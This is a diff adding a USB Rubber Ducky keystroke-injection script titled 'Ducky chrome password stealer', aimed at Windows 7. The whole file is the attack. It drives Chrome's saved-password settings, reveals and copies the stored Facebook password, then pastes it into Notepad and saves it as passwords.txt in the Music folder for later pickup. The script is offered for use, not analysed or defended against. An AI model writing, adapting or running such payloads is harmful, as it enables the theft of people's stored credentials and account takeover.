@@ -1,0 +1,47 @@
+REM Author: Nuk3leus
+REM Ducky chrome password stealer: 1.0
+REM Target: Windows 7
+REM Description: Opens chrome, navigates to chrome settings, navigates to saved passwords, searches for facebook, shows password, copys password
+REM closes chrome, Opens notepad and pastes in password, saves to music folder, closes notepad.
+DELAY 2000
+GUI
+DELAY 500
+STRING chrome
+DELAY 2000
+ENTER
+STRING chrome://settings
+TAB
+REPEAT 16
+ENTER
+DELAY 500
+TAB
+REPEAT 36
+ENTER
+DELAY 500
+STRING facebook
+DELAY 500
+TAB
+DOWN
+TAB
+TAB
+ENTER
+ALT D
+TAB
+REPEAT 3
+CTRL C
+DELAY 500
+ALT F4
+GUI R
+STRING notepad.exe
+CTRL V
+ALT f
+STRING s
+DELAY 500
+STRING passwords.txt
+TAB
+REPEAT 9
+STRING m
+ENTER
+ALT S
+DELAY 500
+ALT F4
